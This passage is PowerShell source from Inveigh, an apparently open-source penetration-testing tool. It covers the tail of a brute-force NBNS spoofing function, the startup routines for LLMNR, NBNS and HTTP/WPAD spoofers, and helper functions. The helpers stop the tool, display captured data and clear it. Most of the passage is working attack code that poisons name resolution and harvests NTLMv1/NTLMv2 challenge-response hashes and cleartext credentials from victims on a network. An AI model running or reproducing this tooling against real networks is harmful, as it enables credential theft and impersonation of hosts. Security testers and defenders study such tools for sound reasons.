    $destination_point = New-Object Net.IPEndpoint($destination_IP,137)
    $NBNS_bruteforce_UDP_client.Connect($destination_point)
       
    while($inveigh.unprivileged_running)
    {

        :NBNS_spoofer_loop while (!$inveigh.hostname_spoof -and $inveigh.unprivileged_running)
        {

            if($NBNS_paused)
            {
                $inveigh.console_queue.Add("$(Get-Date -format 's') - Resuming NBNS brute force spoofer")
                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Resuming NBNS brute force spoofer")])
                $NBNS_paused = $false
            }

            for ($i = 0; $i -lt 255; $i++)
            {

                for ($j = 0; $j -lt 255; $j++)
                {
                    $NBNS_response_packet[0] = $i
                    $NBNS_response_packet[1] = $j                 
                    $NBNS_bruteforce_UDP_client.send($NBNS_response_packet,$NBNS_response_packet.Length)

                    if($inveigh.hostname_spoof -and $NBNSBruteForcePause)
                    {
                        $inveigh.console_queue.Add("$(Get-Date -format 's') - Pausing NBNS brute force spoofer")
                        $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Pausing NBNS brute force spoofer")])
                        $NBNS_paused = $true
                        break NBNS_spoofer_loop
                    }
                
                }
            
            }
        
        }

        Start-Sleep -m 5
    }

    $NBNS_bruteforce_UDP_client.Close()
 }

$control_unprivileged_scriptblock = 
{
    param ($NBNSBruteForcePause,$RunTime)

    if($RunTime)
    {    
        $control_timeout = New-TimeSpan -Minutes $RunTime
        $control_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
    }

    if($NBNSBruteForcePause)
    {   
        $NBNS_pause = New-TimeSpan -Seconds $NBNSBruteForcePause
    }
       
    while ($inveigh.unprivileged_running)
    {

        if($RunTime)
        {
            
            if($control_stopwatch.Elapsed -ge $control_timeout)
            {

                if($inveigh.HTTP_listener.IsListening)
                {
                    $inveigh.HTTP_listener.Stop()
                    $inveigh.HTTP_listener.Close()
                }
            
                if($inveigh.unprivileged_running)
                {                    
                    $inveigh.console_queue.Add("Inveigh Unprivileged exited due to run time at $(Get-Date -format 's')")
                    $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Inveigh Unprivileged exited due to run time")])
                    Start-Sleep -m 5
                    $inveigh.unprivileged_running = $false
                }
            
                if($inveigh.relay_running)
                {
                    $inveigh.console_queue.Add("Inveigh Relay exited due to run time at $(Get-Date -format 's')")
                    $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Inveigh Relay exited due to run time")])
                    Start-Sleep -m 5
                    $inveigh.relay_running = $false
                } 

                if($inveigh.running)
                {
                    $inveigh.console_queue.Add("Inveigh exited due to run time at $(Get-Date -format 's')")
                    $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Inveigh exited due to run time")])
                    Start-Sleep -m 5
                    $inveigh.running = $false
                } 
            
            }
        }

        if($NBNSBruteForcePause -and $inveigh.hostname_spoof)
        {
         
            if($inveigh.NBNS_stopwatch.Elapsed -ge $NBNS_pause)
            {
                $inveigh.hostname_spoof = $false
            }
        
        }

        if($inveigh.file_output -and !$inveigh.running)
        {

            while($inveigh.log_file_queue.Count -gt 0)
            {
                $inveigh.log_file_queue[0]|Out-File $inveigh.log_out_file -Append
                $inveigh.log_file_queue.RemoveAt(0)
            }

            while($inveigh.NTLMv1_file_queue.Count -gt 0)
            {
                $inveigh.NTLMv1_file_queue[0]|Out-File $inveigh.NTLMv1_out_file -Append
                $inveigh.NTLMv1_file_queue.RemoveAt(0)
            }

            while($inveigh.NTLMv2_file_queue.Count -gt 0)
            {
                $inveigh.NTLMv2_file_queue[0]|Out-File $inveigh.NTLMv2_out_file -Append
                $inveigh.NTLMv2_file_queue.RemoveAt(0)
            }

            while($inveigh.cleartext_file_queue.Count -gt 0)
            {
                $inveigh.cleartext_file_queue[0]|Out-File $inveigh.cleartext_out_file -Append
                $inveigh.cleartext_file_queue.RemoveAt(0)
            }
        
        }

        Start-Sleep -m 5
    }
 }

# End ScriptBlocks
# Begin Startup functions

# HTTP Listener Startup function 
function HTTPListener()
{
    $HTTP_runspace = [RunspaceFactory]::CreateRunspace()
    $HTTP_runspace.Open()
    $HTTP_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)
    $HTTP_powershell = [PowerShell]::Create()
    $HTTP_powershell.Runspace = $HTTP_runspace
    $HTTP_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $HTTP_powershell.AddScript($HTTP_scriptblock).AddArgument($Challenge).AddArgument($HTTPAuth).AddArgument(
        $HTTPBasicRealm).AddArgument($HTTPIP).AddArgument($HTTPPort).Addargument($HTTPResponse).AddArgument(
        $NBNSBruteForcePause).AddArgument($WPADAuth).AddArgument($WPADEmptyFile).AddArgument($WPADIP).AddArgument(
        $WPADPort).AddArgument($WPADDirectHosts).AddArgument($WPADResponse).AddArgument($RunCount) > $null
    $HTTP_powershell.BeginInvoke() > $null
}

# LLMNR Spoofer Startup function
function LLMNRSpoofer()
{
    $LLMNR_spoofer_runspace = [RunspaceFactory]::CreateRunspace()
    $LLMNR_spoofer_runspace.Open()
    $LLMNR_spoofer_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)
    $LLMNR_spoofer_powershell = [PowerShell]::Create()
    $LLMNR_spoofer_powershell.Runspace = $LLMNR_spoofer_runspace
    $LLMNR_spoofer_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $LLMNR_spoofer_powershell.AddScript($LLMNR_spoofer_scriptblock).AddArgument(
        $LLMNR_response_message).AddArgument($SpooferIP).AddArgument($SpooferHostsReply).AddArgument(
        $SpooferHostsIgnore).AddArgument($SpooferIPsReply).AddArgument($SpooferIPsIgnore).AddArgument(
        $LLMNRTTL) > $null
    $LLMNR_spoofer_powershell.BeginInvoke() > $null
}

# NBNS Spoofer Startup function
function NBNSSpoofer()
{
    $NBNS_spoofer_runspace = [RunspaceFactory]::CreateRunspace()
    $NBNS_spoofer_runspace.Open()
    $NBNS_spoofer_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)
    $NBNS_spoofer_powershell = [PowerShell]::Create()
    $NBNS_spoofer_powershell.Runspace = $NBNS_spoofer_runspace
    $NBNS_spoofer_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $NBNS_spoofer_powershell.AddScript($NBNS_spoofer_scriptblock).AddArgument($NBNS_response_message).AddArgument(
        $SpooferIP).AddArgument($NBNSTypes).AddArgument($SpooferHostsReply).AddArgument(
        $SpooferHostsIgnore).AddArgument($SpooferIPsReply).AddArgument($SpooferIPsIgnore).AddArgument(
        $NBNSTTL) > $null
    $NBNS_spoofer_powershell.BeginInvoke() > $null
}

# Spoofer Startup function
function NBNSBruteForceSpoofer()
{
    $NBNS_bruteforce_spoofer_runspace = [RunspaceFactory]::CreateRunspace()
    $NBNS_bruteforce_spoofer_runspace.Open()
    $NBNS_bruteforce_spoofer_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)
    $NBNS_bruteforce_spoofer_powershell = [PowerShell]::Create()
    $NBNS_bruteforce_spoofer_powershell.Runspace = $NBNS_bruteforce_spoofer_runspace
    $NBNS_bruteforce_spoofer_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $NBNS_bruteforce_spoofer_powershell.AddScript($NBNS_bruteforce_spoofer_scriptblock).AddArgument(
        $SpooferIP).AddArgument($NBNSBruteForceHost).AddArgument($NBNSBruteForceTarget).AddArgument(
        $NBNSBruteForcePause).AddArgument($NBNSTTL) > $null
    $NBNS_bruteforce_spoofer_powershell.BeginInvoke() > $null
}

# Control Unprivileged Startup function
function ControlUnprivilegedLoop()
{
    $control_unprivileged_runspace = [RunspaceFactory]::CreateRunspace()
    $control_unprivileged_runspace.Open()
    $control_unprivileged_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)
    $control_unprivileged_powershell = [PowerShell]::Create()
    $control_unprivileged_powershell.Runspace = $control_unprivileged_runspace
    $control_unprivileged_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $control_unprivileged_powershell.AddScript($control_unprivileged_scriptblock).AddArgument(
        $NBNSBruteForcePause).AddArgument($RunTime) > $null
    $control_unprivileged_powershell.BeginInvoke() > $null
}

# End Startup functions

# Startup Enabled Services

# HTTP Server Start
if($HTTP -eq 'Y')
{
    HTTPListener
}

# LLMNR Spoofer Start
if($LLMNR -eq 'Y')
{
    LLMNRSpoofer
}

# NBNS Spoofer Start
if($NBNS -eq 'Y')
{
    NBNSSpoofer
}

# NBNSBruteForce Spoofer Start
if($NBNSBruteForce -eq 'Y')
{
    NBNSBruteForceSpoofer
}

# Control Unprivileged Loop Start
if($NBNSBruteForcePause -or $RunTime -or $inveigh.file_output)
{
    ControlUnprivilegedLoop
}

if($inveigh.console_output)
{

    if($ConsoleStatus)
    {    
        $console_status_timeout = New-TimeSpan -Minutes $ConsoleStatus
        $console_status_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
    }

    :console_loop while(($inveigh.unprivileged_running -and $inveigh.console_output) -or ($inveigh.console_queue.Count -gt 0 -and $inveigh.console_output))
    {

        while($inveigh.console_queue.Count -gt 0)
        {

            if($inveigh.output_stream_only)
            {
                Write-Output($inveigh.console_queue[0] + $inveigh.newline)
                $inveigh.console_queue.RemoveAt(0)
            }
            else
            {

                switch -wildcard ($inveigh.console_queue[0])
                {

                    "* written to *"
                    {

                        if($inveigh.file_output)
                        {
                            Write-Warning $inveigh.console_queue[0]
                        }

                        $inveigh.console_queue.RemoveAt(0)
                    }

                    "* for relay *"
                    {
                        Write-Warning $inveigh.console_queue[0]
                        $inveigh.console_queue.RemoveAt(0)
                    }

                    "*SMB relay *"
                    {
                        Write-Warning $inveigh.console_queue[0]
                        $inveigh.console_queue.RemoveAt(0)
                    }

                    "* local administrator *"
                    {
                        Write-Warning $inveigh.console_queue[0]
                        $inveigh.console_queue.RemoveAt(0)
                    }

                    default
                    {
                        Write-Output $inveigh.console_queue[0]
                        $inveigh.console_queue.RemoveAt(0)
                    }

                }

            }

        }

        if($ConsoleStatus -and $console_status_stopwatch.Elapsed -ge $console_status_timeout)
        {
            
            if($inveigh.cleartext_list.Count -gt 0)
            {
                Write-Output("$(Get-Date -format 's') - Current unique cleartext captures:" + $inveigh.newline)
                $inveigh.cleartext_list.Sort()

                foreach($unique_cleartext in $inveigh.cleartext_list)
                {
                    if($unique_cleartext -ne $unique_cleartext_last)
                    {
                        Write-Output($unique_cleartext + $inveigh.newline)
                    }

                    $unique_cleartext_last = $unique_cleartext
                }

                Start-Sleep -m 5
            }
            else
            {
                Write-Output("$(Get-Date -format 's') - No cleartext credentials have been captured" + $inveigh.newline)
            }
            
            if($inveigh.NTLMv1_list.Count -gt 0)
            {
                Write-Output("$(Get-Date -format 's') - Current unique NTLMv1 challenge/response captures:" + $inveigh.newline)
                $inveigh.NTLMv1_list.Sort()

                foreach($unique_NTLMv1 in $inveigh.NTLMv1_list)
                {
                    $unique_NTLMv1_account = $unique_NTLMv1.SubString(0,$unique_NTLMv1.IndexOf(":",($unique_NTLMv1.IndexOf(":") + 2)))

                    if($unique_NTLMv1_account -ne $unique_NTLMv1_account_last)
                    {
                        Write-Output($unique_NTLMv1 + $inveigh.newline)
                    }

                    $unique_NTLMv1_account_last = $unique_NTLMv1_account
                }

                $unique_NTLMv1_account_last = ""
                Start-Sleep -m 5
                Write-Output("$(Get-Date -format 's') - Current NTLMv1 IP addresses and usernames:" + $inveigh.newline)

                foreach($NTLMv1_username in $inveigh.NTLMv1_username_list)
                {
                    Write-Output($NTLMv1_username + $inveigh.newline)
                }

                Start-Sleep -m 5
            }
            else
            {
                Write-Output("$(Get-Date -format 's') - No NTLMv1 challenge/response hashes have been captured" + $inveigh.newline)
            }

            if($inveigh.NTLMv2_list.Count -gt 0)
            {
                Write-Output("$(Get-Date -format 's') - Current unique NTLMv2 challenge/response captures:" + $inveigh.newline)
                $inveigh.NTLMv2_list.Sort()

                foreach($unique_NTLMv2 in $inveigh.NTLMv2_list)
                {
                    $unique_NTLMv2_account = $unique_NTLMv2.SubString(0,$unique_NTLMv2.IndexOf(":",($unique_NTLMv2.IndexOf(":") + 2)))

                    if($unique_NTLMv2_account -ne $unique_NTLMv2_account_last)
                    {
                        Write-Output($unique_NTLMv2 + $inveigh.newline)
                    }

                    $unique_NTLMv2_account_last = $unique_NTLMv2_account
                }

                $unique_NTLMv2_account_last = ""
                Start-Sleep -m 5
                Write-Output("$(Get-Date -format 's') - Current NTLMv2 IP addresses and usernames:" + $inveigh.newline)

                foreach($NTLMv2_username in $inveigh.NTLMv2_username_list)
                {
                    Write-Output($NTLMv2_username + $inveigh.newline)
                }
                
            }
            else
            {
                Write-Output("$(Get-Date -format 's') - No NTLMv2 challenge/response hashes have been captured" + $inveigh.newline)
            }

            $console_status_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()

        }

        if($inveigh.console_input)
        {

            if([Console]::KeyAvailable)
            {
                $inveigh.console_output = $false
                BREAK console_loop
            }
        
        }

        Start-Sleep -s 1
    }

}

if($inveigh.file_output -and !$inveigh.running)
{

    while($inveigh.log_file_queue.Count -gt 0)
    {
        $inveigh.log_file_queue[0]|Out-File $inveigh.log_out_file -Append
        $inveigh.log_file_queue.RemoveAt(0)
    }

    while($inveigh.NTLMv1_file_queue.Count -gt 0)
    {
        $inveigh.NTLMv1_file_queue[0]|Out-File $inveigh.NTLMv1_out_file -Append
        $inveigh.NTLMv1_file_queue.RemoveAt(0)
    }

    while($inveigh.NTLMv2_file_queue.Count -gt 0)
    {
        $inveigh.NTLMv2_file_queue[0]|Out-File $inveigh.NTLMv2_out_file -Append
        $inveigh.NTLMv2_file_queue.RemoveAt(0)
    }

    while($inveigh.cleartext_file_queue.Count -gt 0)
    {
        $inveigh.cleartext_file_queue[0]|Out-File $inveigh.cleartext_out_file -Append
        $inveigh.cleartext_file_queue.RemoveAt(0)
    }

}

}
#End Invoke-InveighBruteForce

function Stop-Inveigh
{
<#
.SYNOPSIS
Stop-Inveigh will stop all running Inveigh functions.
#>

if($inveigh)
{

    if($inveigh.running -or $inveigh.relay_running -or $inveigh.unprivileged_running)
    {

        if($inveigh.HTTP_listener.IsListening)
        {
            $inveigh.HTTP_listener.Stop()
            $inveigh.HTTP_listener.Close()
        }
            
        if($inveigh.unprivileged_running)
        {
            $inveigh.unprivileged_running = $false
            Start-Sleep -s 5
            Write-Output("Inveigh Unprivileged exited at $(Get-Date -format 's')")
            $inveigh.log.Add("$(Get-Date -format 's') - Inveigh Unprivileged exited")  > $null

            if($inveigh.file_output)
            {
                "$(Get-Date -format 's') - Inveigh Unprivileged exited" | Out-File $Inveigh.log_out_file -Append
            }

        }
            
        if($inveigh.relay_running)
        {
            $inveigh.relay_running = $false
            Write-Output("Inveigh Relay exited at $(Get-Date -format 's')")
            $inveigh.log.Add("$(Get-Date -format 's') - Inveigh Relay exited")  > $null

            if($inveigh.file_output)
            {
                "$(Get-Date -format 's') - Inveigh Relay exited" | Out-File $Inveigh.log_out_file -Append
            }

        } 

        if($inveigh.running)
        {
            $inveigh.running = $false
            Write-Output("Inveigh exited at $(Get-Date -format 's')")
            $inveigh.log.Add("$(Get-Date -format 's') - Inveigh exited")  > $null

            if($inveigh.file_output)
            {
                "$(Get-Date -format 's') - Inveigh exited" | Out-File $Inveigh.log_out_file -Append
            }

        } 

    }
    else
    {
        Write-Output("There are no running Inveigh functions")
    }
    
    if($inveigh.HTTPS)
    {
        & "netsh" http delete sslcert ipport=0.0.0.0:443 > $null

        try
        {
            $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
            $certificate_store.Open('ReadWrite')
            $certificate = $certificate_store.certificates.Find("FindByThumbprint",$inveigh.certificate_thumbprint,$FALSE)[0]
            $certificate_store.Remove($certificate)
            $certificate_store.Close()
        }
        catch
        {
            Write-Output("SSL Certificate Deletion Error - Remove Manually")
            $inveigh.log.Add("$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually")  > $null

            if($inveigh.file_output)
            {
                "$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually" | Out-File $Inveigh.log_out_file -Append   
            }

        }
    }

    $inveigh.HTTP = $false
    $inveigh.HTTPS = $false
}
else
{
    Write-Output("There are no running Inveigh functions")|Out-Null
}

} 

function Get-Inveigh
{
<#
.SYNOPSIS
Get-Inveigh will get stored Inveigh data from memory.

.PARAMETER Console
Get queued console output. This is also the default if no parameters are set. 

.PARAMETER Log
Get log entries.

.PARAMETER NTLMv1
Get captured NTLMv1 challenge/response hashes.

.PARAMETER NTLMv1Unique
Get the first captured NTLMv1 challenge/response for each unique account.

.PARAMETER NTLMv1Usernames
Get IP addresses and usernames for captured NTLMv2 challenge/response hashes.

.PARAMETER NTLMv2
Get captured NTLMv1 challenge/response hashes.

.PARAMETER NTLMv2Unique
Get the first captured NTLMv2 challenge/response for each unique account.

.PARAMETER NTLMv2Usernames
Get IP addresses and usernames for captured NTLMv2 challenge/response hashes.

.PARAMETER Cleartext
Get captured cleartext credentials.

.PARAMETER CleartextUnique
Get unique captured cleartext credentials.

.PARAMETER Learning
Get valid hosts discovered through spoofer learning.
#>

[CmdletBinding()]
param
( 
    [parameter(Mandatory=$false)][Switch]$Console,
    [parameter(Mandatory=$false)][Switch]$Log,
    [parameter(Mandatory=$false)][Switch]$NTLMv1,
    [parameter(Mandatory=$false)][Switch]$NTLMv2,
    [parameter(Mandatory=$false)][Switch]$NTLMv1Unique,
    [parameter(Mandatory=$false)][Switch]$NTLMv2Unique,
    [parameter(Mandatory=$false)][Switch]$NTLMv1Usernames,
    [parameter(Mandatory=$false)][Switch]$NTLMv2Usernames,
    [parameter(Mandatory=$false)][Switch]$Cleartext,
    [parameter(Mandatory=$false)][Switch]$CleartextUnique,
    [parameter(Mandatory=$false)][Switch]$Learning,
    [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
)

if($Console -or $PSBoundParameters.Count -eq 0)
{

    while($inveigh.console_queue.Count -gt 0)
    {

        if($inveigh.output_stream_only)
        {
            Write-Output($inveigh.console_queue[0] + $inveigh.newline)
            $inveigh.console_queue.RemoveAt(0)
        }
        else
        {

            switch -wildcard ($inveigh.console_queue[0])
            {

                "* written to *"
                {

                    if($inveigh.file_output)
                    {
                        Write-Warning $inveigh.console_queue[0]
                    }

                    $inveigh.console_queue.RemoveAt(0)
                }

                "* for relay *"
                {
                    Write-Warning $inveigh.console_queue[0]
                    $inveigh.console_queue.RemoveAt(0)
                }

                "*SMB relay *"
                {
                    Write-Warning $inveigh.console_queue[0]
                    $inveigh.console_queue.RemoveAt(0)
                }

                "* local administrator *"
                {
                    Write-Warning $inveigh.console_queue[0]
                    $inveigh.console_queue.RemoveAt(0)
                }

                default
                {
                    Write-Output $inveigh.console_queue[0]
                    $inveigh.console_queue.RemoveAt(0)
                }

            }

        }
         
    }

}

if($Log)
{
    Write-Output $inveigh.log
}

if($NTLMv1)
{
    Write-Output $inveigh.NTLMv1_list
}

if($NTLMv1Unique)
{
    $inveigh.NTLMv1_list.Sort()

    foreach($unique_NTLMv1 in $inveigh.NTLMv1_list)
    {
        $unique_NTLMv1_account = $unique_NTLMv1.SubString(0,$unique_NTLMv1.IndexOf(":",($unique_NTLMv1.IndexOf(":") + 2)))

        if($unique_NTLMv1_account -ne $unique_NTLMv1_account_last)
        {
            Write-Output $unique_NTLMv1
        }

        $unique_NTLMv1_account_last = $unique_NTLMv1_account
    }

}

if($NTLMv1Usernames)
{
    Write-Output $inveigh.NTLMv2_username_list
}

if($NTLMv2)
{
    Write-Output $inveigh.NTLMv2_list
}

if($NTLMv2Unique)
{
    $inveigh.NTLMv2_list.Sort()

    foreach($unique_NTLMv2 in $inveigh.NTLMv2_list)
    {
        $unique_NTLMv2_account = $unique_NTLMv2.SubString(0,$unique_NTLMv2.IndexOf(":",($unique_NTLMv2.IndexOf(":") + 2)))

        if($unique_NTLMv2_account -ne $unique_NTLMv2_account_last)
        {
            Write-Output $unique_NTLMv2
        }

        $unique_NTLMv2_account_last = $unique_NTLMv2_account
    }

}

if($NTLMv2Usernames)
{
    Write-Output $inveigh.NTLMv2_username_list
}

if($Cleartext)
{
    Write-Output $inveigh.cleartext_list
}

if($CleartextUnique)
{
    Write-Output $inveigh.cleartext_list | Get-Unique
}

if($Learning)
{
    Write-Output $inveigh.valid_host_list
}

}

function Watch-Inveigh
{
<#
.SYNOPSIS
Watch-Inveigh will enabled real time console output. If using this function through a shell, test to ensure that it doesn't hang the shell.
#>

if($inveigh.tool -ne 1)
{

    if($inveigh.running -or $inveigh.relay_running -or $inveigh.unprivileged_running)
    {
        Write-Output "Press any key to stop real time console output"
        $inveigh.console_output = $true

        :console_loop while((($inveigh.running -or $inveigh.relay_running -or $inveigh.unprivileged_running) -and $inveigh.console_output) -or ($inveigh.console_queue.Count -gt 0 -and $inveigh.console_output))
        {

            while($inveigh.console_queue.Count -gt 0)
            {

                if($inveigh.output_stream_only)
                {
                    Write-Output($inveigh.console_queue[0] + $inveigh.newline)
                    $inveigh.console_queue.RemoveAt(0)
                }
                else
                {

                    switch -wildcard ($inveigh.console_queue[0])
                    {
                          
                        "* written to *"
                        {

                            if($inveigh.file_output)
                            {
                                Write-Warning $inveigh.console_queue[0]
                            }

                            $inveigh.console_queue.RemoveAt(0)
                        }

                        "* for relay *"
                        {
                            Write-Warning $inveigh.console_queue[0]
                            $inveigh.console_queue.RemoveAt(0)
                        }

                        "*SMB relay *"
                        {
                            Write-Warning $inveigh.console_queue[0]
                            $inveigh.console_queue.RemoveAt(0)
                        }

                        "* local administrator *"
                        {
                            Write-Warning $inveigh.console_queue[0]
                            $inveigh.console_queue.RemoveAt(0)
                        }

                        default
                        {
                            Write-Output $inveigh.console_queue[0]
                            $inveigh.console_queue.RemoveAt(0)
                        }

                    }

                }
                             
            }

            if([Console]::KeyAvailable)
            {
                $inveigh.console_output = $false
                BREAK console_loop
            }

            Start-Sleep -m 5
        }

    }
    else
    {
        Write-Output "Inveigh isn't running"
    }

}
else
{
    Write-Output "Watch-Inveigh cannot be used with current external tool selection"
}

}

function Clear-Inveigh
{
<#
.SYNOPSIS
Clear-Inveigh will clear Inveigh data from memory.
#>

if($inveigh)
{

    if(!$inveigh.running -and !$inveigh.relay_running -and !$inveigh.unprivileged_running)
    {
        Remove-Variable inveigh -scope global
        Write-Output "Inveigh data has been cleared from memory"
    }
    else
    {
        Write-Output "Run Stop-Inveigh before running Clear-Inveigh"
    }

}

}
